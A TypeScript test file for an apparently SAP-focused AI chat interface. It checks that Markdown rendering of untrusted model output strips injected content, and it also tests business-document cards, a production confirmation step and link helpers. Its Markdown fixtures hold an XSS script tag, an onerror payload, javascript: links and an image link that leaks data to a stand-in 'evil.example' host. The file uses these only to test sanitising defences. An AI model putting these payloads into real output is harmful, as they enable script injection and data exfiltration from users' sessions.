import type { UIComponent } from '@prowess/contracts';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import Markdown from '@/components/chat/Markdown';
import { SapComponent } from '@/components/sap/cards';
import { ConfirmationCard } from '@/components/chat/ConfirmationCard';
import { groupConversations, safeHref } from '@/lib/format';

describe('Markdown rendering of untrusted model output', () => {
  const html = renderToStaticMarkup(
    <Markdown
      text={[
        '**bold** and a [safe link](https://help.sap.com/x)',
        '<script>alert(1)</script><img src=x onerror=alert(2)>',
        '[click me](javascript:alert(3))',
        '![tracker](https://evil.example/leak?data=secret)',
        '| a | b |\n|---|---|\n| 1 | 2 |',
      ].join('\n\n')}
    />,
  );

  it('drops raw HTML', () => {
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('neutralizes javascript: links and hardens safe ones', () => {
    expect(html).not.toContain('javascript:');
    expect(html).toContain('href="https://help.sap.com/x"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('never loads images (exfiltration channel)', () => {
    expect(html).not.toMatch(/<img/);
    expect(html).toContain('[image: tracker');
  });

  it('renders GFM tables', () => {
    expect(html).toContain('<table>');
  });
});

describe('SAP component registry', () => {
  it('renders a trusted invoice card with the payment block', () => {
    const component: UIComponent = {
      type: 'invoice',
      data: {
        number: '5100012345',
        fiscalYear: '2026',
        companyCode: '1000',
        vendorId: '1000123',
        vendorName: 'ABC Trading LLC',
        amount: { amount: 428350, currency: 'SAR' },
        status: 'PAYMENT_BLOCKED',
        paymentBlock: { code: 'R', description: 'Invoice verification' },
        blockReasons: ['Quantity variance'],
      },
    };
    const html = renderToStaticMarkup(<SapComponent component={component} />);
    expect(html).toContain('5100012345');
    expect(html).toContain('Payment blocked');
    expect(html).toContain('Invoice verification');
    expect(html).toContain('Quantity variance');
  });

  it('renders order-to-cash cards from validated components', () => {
    const order: UIComponent = {
      type: 'sales_order',
      data: {
        number: '648',
        orderType: 'OR',
        soldTo: '7000000010',
        soldToName: 'Local Customer-01',
        netValue: { amount: 5000, currency: 'SAR' },
        deliveryStatus: 'NOT_STARTED',
        billingStatus: 'NOT_STARTED',
        creditStatus: 'BLOCKED',
        blocks: ['Credit block'],
      },
    };
    const orderHtml = renderToStaticMarkup(<SapComponent component={order} />);
    for (const text of ['Sales order', '648', 'Local Customer-01', 'Blocked', 'Credit block', 'Not started']) expect(orderHtml).toContain(text);

    const items: UIComponent = {
      type: 'open_items',
      data: {
        accountType: 'CUSTOMER',
        account: '7000000010',
        accountName: 'Local Customer-01',
        companyCode: '1030',
        total: { amount: 2500, currency: 'SAR' },
        overdue: { amount: 2500, currency: 'SAR' },
        items: [
          { document: '2000016', documentType: 'DR', postingDate: '2026-09-22', dueDate: '2026-09-22', amount: { amount: 2500, currency: 'SAR' }, status: 'OVERDUE' },
          { document: '1000000001', documentType: 'RV', postingDate: '2026-09-26', amount: { amount: 5000, currency: 'SAR' }, status: 'CLEARED', clearingDocument: '5000006' },
        ],
      },
    };
    const itemsHtml = renderToStaticMarkup(<SapComponent component={items} />);
    for (const text of ['Customer line items', 'Overdue items', '2000016', 'Cleared', '5000006']) expect(itemsHtml).toContain(text);

    const journal: UIComponent = {
      type: 'accounting_document',
      data: {
        number: '1000000001',
        companyCode: '1030',
        fiscalYear: '2026',
        documentType: 'RV',
        postingDate: '2026-09-26',
        reference: '0090000181',
        items: [
          { item: '1', account: '7000000010', description: 'Local Customer-01', amount: { amount: 5000, currency: 'SAR' }, debitCredit: 'D' },
          { item: '2', account: '700000', description: 'Sales', amount: { amount: -5000, currency: 'SAR' }, debitCredit: 'C' },
        ],
      },
    };
    const journalHtml = renderToStaticMarkup(<SapComponent component={journal} />);
    for (const text of ['Accounting document', '0090000181', 'Debit', 'Credit', '700000']) expect(journalHtml).toContain(text);
    // Credit lines show the magnitude in the credit column, never a negative debit.
    expect(journalHtml).not.toContain('-5,000');
  });

  it('renders a workflow run with the agent and state of each step', () => {
    const run: UIComponent = {
      type: 'workflow_run',
      data: {
        id: 'r_1',
        workflow: 'Order-to-cash',
        title: 'Order-to-cash for sales order 650',
        status: 'blocked',
        reason: 'The sales order is blocked by the credit check.',
        steps: [
          { id: 'order', title: 'Check the sales order', agent: 'SD', state: 'done', detail: 'Sales order 650 is worth SAR 140,000.' },
          { id: 'credit', title: 'Check the credit exposure', agent: 'FICO', state: 'done' },
          { id: 'delivery', title: 'Create the outbound delivery', agent: 'SD', state: 'pending' },
        ],
      },
    };
    const html = renderToStaticMarkup(<SapComponent component={run} />);
    for (const text of ['Process run', 'Order-to-cash for sales order 650', 'Blocked', '2 of 3 steps done', 'FICO', 'Not started', 'blocked by the credit check']) {
      expect(html).toContain(text);
    }
  });

  it('renders nothing for unknown component types', () => {
    const html = renderToStaticMarkup(<SapComponent component={{ type: 'html', data: '<b>x</b>' } as unknown as UIComponent} />);
    expect(html).toBe('');
  });
});

describe('Confirmation card', () => {
  const base = {
    id: 'a_1',
    action: 'Release invoice payment block',
    targetSystem: 'S4-PRD',
    businessObject: { type: 'Supplier invoice', id: '5100012345/2026' },
    proposedChange: 'Remove block R',
    impact: 'Invoice becomes payable',
    risk: 'HIGH_IMPACT' as const,
    expiresAt: new Date(Date.now() + 600_000).toISOString(),
    status: 'pending' as const,
  };

  it('requires explicit acknowledgement for production', () => {
    const html = renderToStaticMarkup(<ConfirmationCard confirmation={{ ...base, environment: 'PROD' }} onResolved={() => undefined} />);
    expect(html).toContain('PRODUCTION');
    expect(html).toContain('I understand this changes');
    expect(html).toMatch(/<button[^>]*disabled=""[^>]*>Confirm<\/button>/);
  });

  it('shows action, system, object, change and impact', () => {
    const html = renderToStaticMarkup(<ConfirmationCard confirmation={{ ...base, environment: 'QA' }} onResolved={() => undefined} />);
    for (const text of ['Release invoice payment block', 'S4-PRD', '5100012345/2026', 'Remove block R', 'Invoice becomes payable', 'Cancel', 'Confirm']) {
      expect(html).toContain(text);
    }
  });
});

describe('format helpers', () => {
  it('only allows http(s)/mailto hrefs', () => {
    expect(safeHref('javascript:alert(1)')).toBeUndefined();
    expect(safeHref('/relative')).toBeUndefined();
    expect(safeHref('https://sap.com')).toBe('https://sap.com/');
  });

  it('groups conversations by recency', () => {
    const now = new Date('2026-09-29T12:00:00');
    const at = (d: string) => ({ id: d, title: d, agent: 'fico', createdAt: d, updatedAt: d });
    const groups = groupConversations([at('2026-09-29T09:00:00'), at('2026-09-28T09:00:00'), at('2026-09-25T09:00:00'), at('2026-08-01T09:00:00')], now);
    expect(groups.map((g) => g.label)).toEqual(['Today', 'Yesterday', 'Previous 7 Days', 'Older']);
  });
});
